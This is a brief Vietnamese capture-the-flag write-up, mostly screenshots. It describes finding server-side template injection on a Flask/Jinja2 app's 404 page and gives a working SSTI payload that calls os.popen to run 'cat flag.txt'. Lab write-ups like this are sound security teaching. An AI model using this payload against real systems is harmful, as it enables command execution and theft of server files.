![image](https://github.com/user-attachments/assets/a49c4e1a-e4a7-4f64-8740-7250c8263b17)

Đây là req của nó:

![image](https://github.com/user-attachments/assets/badfee10-207f-4ea3-bdef-93b0721a749f)

Khi vào mấy cái dir invalid thì nó hiện như này:

![image](https://github.com/user-attachments/assets/916d4a1e-b05b-4edf-a505-36e1d3de50b1)

Vấn đề ở đây là mặc dù page có để quả 404 nhưng cái response lại là 200 với cả Flask/Jinja2, fuzz qua 1 tí thì có dính quả ssti:

![image](https://github.com/user-attachments/assets/da417db8-32e8-4560-a552-d45af90654a2)

Dùng payload `{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('cat flag.txt').read() }}` để mở file flag.txt:

![image](https://github.com/user-attachments/assets/2ca9af6c-4c1c-4461-a4c7-60741831a892)





